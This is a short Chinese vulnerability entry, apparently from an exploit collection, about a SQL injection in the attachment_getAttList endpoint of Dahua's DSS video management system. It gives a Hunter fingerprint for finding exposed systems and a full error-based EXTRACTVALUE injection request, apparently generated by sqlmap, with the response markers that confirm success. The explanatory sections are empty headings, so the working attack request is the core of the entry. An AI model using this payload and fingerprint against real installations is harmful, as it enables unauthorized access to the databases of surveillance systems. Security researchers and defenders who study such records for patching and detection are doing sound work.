# 大华DSS视频管理系统attachment_getAttList存在SQL注入漏洞

- **系统**：大华　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`hunter：`app.name=="Dahua 大华 DSS 视频管理系统"``
- **请求**：`GET /portal/attachment_getAttList.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x5c,0x716b6b6b71,(SELECT%20(ELT(8841=8841,1))),0x7178786271))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTTP/1.1`
- **关键头**：`Content-Length: 345`

**请求体 / payload**
```
qkkkq1qxxbq
sqlmap
/portal/attachment_getAttList.action?bean.RecId=1&bean.TabName=1
```

**其他**
- 大华 DSS 视频管理系统attachment\_getAttList存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 大华 DSS 视频管理系统